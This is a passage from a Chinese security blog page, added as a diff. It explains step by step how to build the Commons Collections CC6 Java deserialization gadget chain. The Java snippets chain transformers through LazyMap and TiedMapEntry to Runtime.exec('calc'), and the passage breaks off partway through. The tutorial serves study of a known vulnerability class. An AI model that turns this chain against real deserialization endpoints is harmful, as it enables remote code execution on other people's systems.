@@ -1,0 +1,1132 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial - 欢迎入侵本站</title>
+
+  
+    <meta name="description" content="代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial 为什么需要 CC6？CC1 的限制 CC6 存在的意义 调用链全貌 一步步构造 CC6 第一步：用 ChainedTransformer 串联恶意链 第二步：LazyMap.get() 触发 transform 第三步：谁调用 get()？——TiedMapEntry.getValue() 第四步：谁调用 getVa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial">
+<meta property="og:url" content="https://wr0ld.github.io/posts/a7b3c9d2/">
+<meta property="og:site_name" content="欢迎入侵本站">
+<meta property="og:description" content="代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial 为什么需要 CC6？CC1 的限制 CC6 存在的意义 调用链全貌 一步步构造 CC6 第一步：用 ChainedTransformer 串联恶意链 第二步：LazyMap.get() 触发 transform 第三步：谁调用 get()？——TiedMapEntry.getValue() 第四步：谁调用 getVa">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-04-03T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-03T08:24:08.130Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="Java反序列化">
+<meta property="article:tag" content="CC6">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="代码审计,Java,反序列化,Java反序列化,CC6">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.0.0">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-03T10:00:00+08:00","dateModified":"2026-04-03T16:24:08+08:00","datePublished":"2026-04-03T10:00:00+08:00","description":"","headline":"代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/a7b3c9d2/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/a7b3c9d2/","keywords":"代码审计, Java, 反序列化, Java反序列化, CC6","thumbnailUrl":"https://www.loliapi.com/acg/pc/","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">欢迎入侵本站</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报 <span class="todo-count">(10)</span></span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-content">fastjson代码审计（1.2.68 → 1.2.80）</span></div><div class="todo-item doing"><span class="todo-content">java cc链</span></div><div class="todo-item doing"><span class="todo-content">Shiro 反序列化</span></div><div class="todo-item doing"><span class="todo-content">信息收集方法论</span></div><div class="todo-item doing"><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-content">EDUSRC实战漏洞挖掘复盘（脱敏）</span></div><div class="todo-item doing"><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/cc/">cc</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-04-03T02:00:00.000Z">2026-04-03</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-04-03T08:24:08.130Z">2026-04-03</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="代码审计-CC6-链-——-反向构造-payload-与-ysoserial"><a href="#代码审计-CC6-链-——-反向构造-payload-与-ysoserial" class="headerlink" title="代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial"></a>代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial</h1><ul>
+<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81-cc6cc1-%E7%9A%84%E9%99%90%E5%88%B6">为什么需要 CC6？CC1 的限制</a></li>
+<li><a href="#cc6-%E5%AD%98%E5%9C%A8%E7%9A%84%E6%84%8F%E4%B9%89">CC6 存在的意义</a></li>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%85%A8%E8%B2%8C">调用链全貌</a></li>
+<li><a href="#%E4%B8%80%E6%AD%A5%E6%AD%A5%E6%9E%84%E9%80%A0-cc6">一步步构造 CC6</a><ul>
+<li><a href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%E7%94%A8-chainedtransformer-%E4%B8%B2%E8%81%94%E6%81%B6%E6%84%8F%E9%93%BE">第一步：用 ChainedTransformer 串联恶意链</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5lazymapget-%E8%A7%A6%E5%8F%91-transform">第二步：LazyMap.get() 触发 transform</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%E8%B0%81%E8%B0%83%E7%94%A8-gettiledmapentrygetvalue">第三步：谁调用 get()？——TiedMapEntry.getValue()</a></li>
+<li><a href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%E8%B0%81%E8%B0%83%E7%94%A8-getvaluetiledmapentryhashcode">第四步：谁调用 getValue()？——TiedMapEntry.hashCode()</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%94%E6%AD%A5hashsetreadobject-%E8%A7%A6%E5%8F%91-hashcode">第五步：HashSet.readObject() 触发 hashCode()</a></li>
+</ul>
+</li>
+<li><a href="#%E5%A4%A7%E5%9D%91%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6%E5%B0%B1%E8%A7%A6%E5%8F%91%E4%BA%86">大坑：序列化时就触发了</a><ul>
+<li><a href="#%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98%E7%9A%84%E6%A0%B9%E5%9B%A0">缓存问题的根因</a></li>
+<li><a href="#%E8%A7%A3%E6%B3%95%E4%B8%80add-%E4%B9%8B%E5%90%8E%E7%9B%B4%E6%8E%A5-clear">解法一：add 之后直接 clear</a></li>
+<li><a href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%E5%AE%8C%E6%95%B4%E7%89%88%E5%81%87%E9%93%BE--%E5%8F%8D%E5%B0%84%E6%8D%A2%E7%9C%9F%E9%93%BE">解法二（完整版）：假链 + 反射换真链</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AF%B9%E6%AF%94-ysoserial-%E7%9A%84%E5%AE%9E%E7%8E%B0">对比 ysoserial 的实现</a></li>
+<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AF%B4-cc6-%E6%98%AF%E9%80%9A%E6%9D%80%E9%93%BE">为什么说 CC6 是通杀链</a></li>
+</ul>
+<hr>
+<h2 id="为什么需要-CC6？CC1-的限制"><a href="#为什么需要-CC6？CC1-的限制" class="headerlink" title="为什么需要 CC6？CC1 的限制"></a>为什么需要 CC6？CC1 的限制</h2><p>在学 CC1 的时候就注意到它有两个比较关键的版本限制：</p>
+<ol>
+<li><strong>JDK 版本限制（最关键）</strong>：CC1 要求 JDK 8u71 之前，8u71 之后 AnnotationInvocationHandler 的 readObject 逻辑被改掉了，链子就断了。</li>
+<li><strong>Commons Collections 版本限制</strong>：需要 Commons Collections 3.1 ~ 3.2.1，不支持 CC4.x。</li>
+</ol>
+<p>这就导致一个很现实的问题：很多生产环境跑的 JDK 版本不一定刚好在 8u71 以下，CC1 的适用范围其实挺窄的。</p>
+<hr>
+<h2 id="CC6-存在的意义"><a href="#CC6-存在的意义" class="headerlink" title="CC6 存在的意义"></a>CC6 存在的意义</h2><p>CC6 的解法思路很直接——<strong>把触发入口整个换掉</strong>，不走 AnnotationInvocationHandler 这条路，改用 <code>HashSet → TiedMapEntry → LazyMap.get()</code> 来触发。因为新的触发路径不依赖那个被改掉的类，所以：</p>
+<ul>
+<li><strong>不受 JDK 版本限制</strong>（8u71+、JDK 11 都能打）</li>
+<li>支持 Commons Collections 3.x</li>
+</ul>
+<p>说白了，CC6 就是拿 CC1 的执行链（ChainedTransformer 那套），然后换了一个新的”引爆方式”。</p>
+<h3 id="为什么-CC6-能绕过-JDK-限制？"><a href="#为什么-CC6-能绕过-JDK-限制？" class="headerlink" title="为什么 CC6 能绕过 JDK 限制？"></a>为什么 CC6 能绕过 JDK 限制？</h3><p>CC1 依赖 <code>AnnotationInvocationHandler.readObject()</code> 来触发 LazyMap.get()，而这个类在 8u71 被修改了。CC6 的思路是<strong>完全换一个触发入口</strong>，找一个在任意 JDK 版本下，readObject() 都会调用 hashCode() 的类。这个答案就是 HashSet。</p>
+<hr>
+<h2 id="调用链全貌"><a href="#调用链全貌" class="headerlink" title="调用链全貌"></a>调用链全貌</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">  → HashMap.put()</span><br><span class="line">    → HashMap.hash(key)</span><br><span class="line">      → TiedMapEntry.hashCode()</span><br><span class="line">        → TiedMapEntry.getValue()</span><br><span class="line">          → LazyMap.get()</span><br><span class="line">            → ChainedTransformer.transform()</span><br><span class="line">              → InvokerTransformer.transform()</span><br><span class="line">                → Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<p>后半段（LazyMap 之后）和 CC1 LazyMap 版本一模一样，区别就在前半段的触发方式。</p>
+<hr>
+<h2 id="一步步构造-CC6"><a href="#一步步构造-CC6" class="headerlink" title="一步步构造 CC6"></a>一步步构造 CC6</h2><h3 id="第一步：用-ChainedTransformer-串联恶意链"><a href="#第一步：用-ChainedTransformer-串联恶意链" class="headerlink" title="第一步：用 ChainedTransformer 串联恶意链"></a>第一步：用 ChainedTransformer 串联恶意链</h3><p>这部分和 CC1 完全一样，通过反射拿到 Runtime 然后执行命令：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
+
+<p>执行效果等价于 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>。</p>
+<hr>
+<h3 id="第二步：LazyMap-get-触发-transform"><a href="#第二步：LazyMap-get-触发-transform" class="headerlink" title="第二步：LazyMap.get() 触发 transform"></a>第二步：LazyMap.get() 触发 transform</h3><p>CC6 依然借用 LazyMap，核心还是它的 get() 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key); <span class="comment">// 触发我们的 chain</span></span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要用一个<strong>不存在的 key</strong> 去调 <code>lazyMap.get(key)</code>，就会走 transform 逻辑。</p>
+<p>LazyMap 的构造方法是 protected，所以要用它暴露出来的 <code>decorate()</code> 工厂方法来构造：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chain);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="第三步：谁调用-get-？——TiedMapEntry-getValue"><a href="#第三步：谁调用-get-？——TiedMapEntry-getValue" class="headerlink" title="第三步：谁调用 get()？——TiedMapEntry.getValue()"></a>第三步：谁调用 get()？——TiedMapEntry.getValue()</h3><p>这里就和 CC1 分叉了。CC1 是靠 <code>AnnotationInvocationHandler.invoke()</code> 里的 get 来触发，而 CC6 选的是 <code>TiedMapEntry.getValue()</code>。</p>
+<p>TiedMapEntry 也是 commons-collections 里的一个类，它持有一个 map 和一个 key。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image1.png"></p>
+<p>它的 getValue() 方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image2.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key); <span class="comment">// 直接调用传入 map 的 get 方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果让 TiedMapEntry 内部的 map 指向我们构造的 LazyMap，那么：</p>
+<blockquote>
+<p>调用 <code>tiedMapEntry.getValue()</code> → 调用 <code>lazyMap.get(key)</code> → 触发命令执行</p>
+</blockquote>
+<p>并且 TiedMapEntry 的构造方法是 public 的，可以直接 new：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">entry.getValue(); <span class="comment">// 此时可以直接触发</span></span><br></pre></td></tr></table></figure>
+
+<p>key 的值没有严格要求，随便写一个字符串就行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image3.png"></p>
+<hr>
+<h3 id="第四步：谁调用-getValue-？——TiedMapEntry-hashCode"><a href="#第四步：谁调用-getValue-？——TiedMapEntry-hashCode" class="headerlink" title="第四步：谁调用 getValue()？——TiedMapEntry.hashCode()"></a>第四步：谁调用 getValue()？——TiedMapEntry.hashCode()</h3><p>在 TiedMapEntry 的同一个文件里，找到了 hashCode() 方法，它内部会调用 getValue()：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image5.png"></p>
+<p>看到这里可能会觉得：<code>getValue()</code> 和 <code>hashCode()</code> 不都能直接触发吗，有什么区别？</p>
+<p>确实，单独调用这两个都能触发，但 hashCode 是 CC6 绕过 JDK 限制的关键所在——因为 HashSet 的 readObject() 方法在反序列化时会自动调用 hashCode()，不需要我们手动触发。</p>
+<hr>
+<h3 id="第五步：HashSet-readObject-触发-hashCode"><a href="#第五步：HashSet-readObject-触发-hashCode" class="headerlink" title="第五步：HashSet.readObject() 触发 hashCode()"></a>第五步：HashSet.readObject() 触发 hashCode()</h3><p>看一下 HashSet 的 readObject() 方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image6.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HashSet.readObject() 简化逻辑</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">    <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">    map.put(e, PRESENT); <span class="comment">// map 是 HashMap，e 是我们的 TiedMapEntry</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进 <code>map.put(e, PRESENT)</code> 会发现内部会调用 put 函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image7.png"></p>
+<p>然后是 hash 函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image8.png"></p>
+<p>这里的 key 就是 <code>map.put(e, PRESENT)</code> 里的 e，也就是我们的 TiedMapEntry，所以最终会调用 <code>TiedMapEntry.hashCode()</code>。</p>
+<p>而整个逻辑都在 HashSet.readObject() 里面，也就是说：<strong>反序列化 HashSet 时必然触发这条链</strong>。</p>
+<hr>
+<h2 id="大坑：序列化时就触发了"><a href="#大坑：序列化时就触发了" class="headerlink" title="大坑：序列化时就触发了"></a>大坑：序列化时就触发了</h2><p>调用链搞清楚之后，开始动手构造 HashSet 对象。可以看到 HashSet 的构造方法不需要传参：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image9.png"></p>
+<p>但如果直接写成这样：</p>
